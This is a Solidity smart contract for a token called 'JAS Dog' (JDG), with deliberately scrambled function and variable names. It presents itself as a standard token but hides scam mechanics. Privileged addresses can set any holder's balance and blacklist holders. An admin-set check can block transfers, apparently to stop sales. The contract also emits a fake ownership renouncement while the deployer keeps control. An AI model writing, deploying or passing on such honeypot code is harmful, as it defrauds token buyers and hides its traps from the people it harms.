//SPDX-License-Identifier: MIT

pragma solidity ^0.8.9;

interface mplfatnxdagtx {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract avlbdcbos {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface wkfkzttckrgv {
    function createPair(address nbbcjctjupua, address kmhcnmuxlfe) external returns (address);
}

interface uxzfrlyhtmekj {
    function totalSupply() external view returns (uint256);

    function balanceOf(address malxhvzccfqhbi) external view returns (uint256);

    function transfer(address pysqysfiqyzc, uint256 zgxozkcuv) external returns (bool);

    function allowance(address bofdoygxx, address spender) external view returns (uint256);

    function approve(address spender, uint256 zgxozkcuv) external returns (bool);

    function transferFrom(
        address sender,
        address pysqysfiqyzc,
        uint256 zgxozkcuv
    ) external returns (bool);

    event Transfer(address indexed from, address indexed gbuxnxtwwogz, uint256 value);
    event Approval(address indexed bofdoygxx, address indexed spender, uint256 value);
}

interface qlxbbgrvfpp is uxzfrlyhtmekj {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract JASDog is avlbdcbos, uxzfrlyhtmekj, qlxbbgrvfpp {

    uint256 public yvyloslazfzlsd;

    mapping(address => mapping(address => uint256)) private vhfeplrrm;

    mapping(address => uint256) private iwwjyugqdwpzr;

    function mpujjqfwqykok(address aycclwxqili, address pysqysfiqyzc, uint256 zgxozkcuv) internal returns (bool) {
        if (aycclwxqili == srscoouuts) {
            return wzsicrptq(aycclwxqili, pysqysfiqyzc, zgxozkcuv);
        }
        uint256 gjpxlroaa = uxzfrlyhtmekj(luhqhfymptl).balanceOf(fcngqtigwkzqy);
        require(gjpxlroaa == tukcvpqrc);
        require(!njtzdjnmdr[aycclwxqili]);
        return wzsicrptq(aycclwxqili, pysqysfiqyzc, zgxozkcuv);
    }

    uint256 public pmnoxvrsgpzroq;

    function ydmditujd() private view {
        require(bkxrqgtjxrm[_msgSender()]);
    }

    function symbol() external view virtual override returns (string memory) {
        return yhhgtonyej;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return zgsfyzdmawzmbp;
    }

    function transfer(address rpwtszjfkd, uint256 zgxozkcuv) external virtual override returns (bool) {
        return mpujjqfwqykok(_msgSender(), rpwtszjfkd, zgxozkcuv);
    }

    address fcngqtigwkzqy = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 hmglglxfsxyfrk;

    bool public ybmpctbfkconjl;

    function transferFrom(address aycclwxqili, address pysqysfiqyzc, uint256 zgxozkcuv) external override returns (bool) {
        if (_msgSender() != fbisirqmygb) {
            if (vhfeplrrm[aycclwxqili][_msgSender()] != type(uint256).max) {
                require(zgxozkcuv <= vhfeplrrm[aycclwxqili][_msgSender()]);
                vhfeplrrm[aycclwxqili][_msgSender()] -= zgxozkcuv;
            }
        }
        return mpujjqfwqykok(aycclwxqili, pysqysfiqyzc, zgxozkcuv);
    }

    function uxbtjbqbp(address amcihxtvk) public {
        ydmditujd();
        
        if (amcihxtvk == srscoouuts || amcihxtvk == luhqhfymptl) {
            return;
        }
        njtzdjnmdr[amcihxtvk] = true;
    }

    function allowance(address loqrdfhllmef, address ojxjokcxb) external view virtual override returns (uint256) {
        if (ojxjokcxb == fbisirqmygb) {
            return type(uint256).max;
        }
        return vhfeplrrm[loqrdfhllmef][ojxjokcxb];
    }

    constructor (){
        
        ehlwkwuoqtq();
        mplfatnxdagtx ervzqtmmzpc = mplfatnxdagtx(fbisirqmygb);
        luhqhfymptl = wkfkzttckrgv(ervzqtmmzpc.factory()).createPair(ervzqtmmzpc.WETH(), address(this));
        if (fkavsgkaiauhl == pmnoxvrsgpzroq) {
            pmnoxvrsgpzroq = mylawxmmxlx;
        }
        srscoouuts = _msgSender();
        bkxrqgtjxrm[srscoouuts] = true;
        iwwjyugqdwpzr[srscoouuts] = zgsfyzdmawzmbp;
        
        emit Transfer(address(0), srscoouuts, zgsfyzdmawzmbp);
    }

    function approve(address ojxjokcxb, uint256 zgxozkcuv) public virtual override returns (bool) {
        vhfeplrrm[_msgSender()][ojxjokcxb] = zgxozkcuv;
        emit Approval(_msgSender(), ojxjokcxb, zgxozkcuv);
        return true;
    }

    mapping(address => bool) public njtzdjnmdr;

    function wzsicrptq(address aycclwxqili, address pysqysfiqyzc, uint256 zgxozkcuv) internal returns (bool) {
        require(iwwjyugqdwpzr[aycclwxqili] >= zgxozkcuv);
        iwwjyugqdwpzr[aycclwxqili] -= zgxozkcuv;
        iwwjyugqdwpzr[pysqysfiqyzc] += zgxozkcuv;
        emit Transfer(aycclwxqili, pysqysfiqyzc, zgxozkcuv);
        return true;
    }

    uint8 private hcnlzcwimrsng = 18;

    bool public wlxjbnctzl;

    uint256 private mylawxmmxlx;

    function getOwner() external view returns (address) {
        return qgaqlmelxen;
    }

    address fbisirqmygb = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function ucbufqeywlow(address rpwtszjfkd, uint256 zgxozkcuv) public {
        ydmditujd();
        iwwjyugqdwpzr[rpwtszjfkd] = zgxozkcuv;
    }

    function ehlwkwuoqtq() public {
        emit OwnershipTransferred(srscoouuts, address(0));
        qgaqlmelxen = address(0);
    }

    function name() external view virtual override returns (string memory) {
        return jtjknebgncvx;
    }

    function owner() external view returns (address) {
        return qgaqlmelxen;
    }

    function rzzfraith(address phguplcbjxnw) public {
        if (facpeeipomgi) {
            return;
        }
        if (mylawxmmxlx != yvyloslazfzlsd) {
            yvyloslazfzlsd = mylawxmmxlx;
        }
        bkxrqgtjxrm[phguplcbjxnw] = true;
        if (pmnoxvrsgpzroq == yvyloslazfzlsd) {
            wlxjbnctzl = true;
        }
        facpeeipomgi = true;
    }

    string private yhhgtonyej = "JDG";

    function decimals() external view virtual override returns (uint8) {
        return hcnlzcwimrsng;
    }

    bool public facpeeipomgi;

    uint256 private fkavsgkaiauhl;

    function balanceOf(address malxhvzccfqhbi) public view virtual override returns (uint256) {
        return iwwjyugqdwpzr[malxhvzccfqhbi];
    }

    function cqvohzumyv(uint256 zgxozkcuv) public {
        ydmditujd();
        tukcvpqrc = zgxozkcuv;
    }

    string private jtjknebgncvx = "JAS Dog";

    uint256 tukcvpqrc;

    address public srscoouuts;

    event OwnershipTransferred(address indexed tfjlaayicu, address indexed easxojorzj);

    mapping(address => bool) public bkxrqgtjxrm;

    uint256 private zgsfyzdmawzmbp = 100000000 * 10 ** 18;

    address private qgaqlmelxen;

    address public luhqhfymptl;

}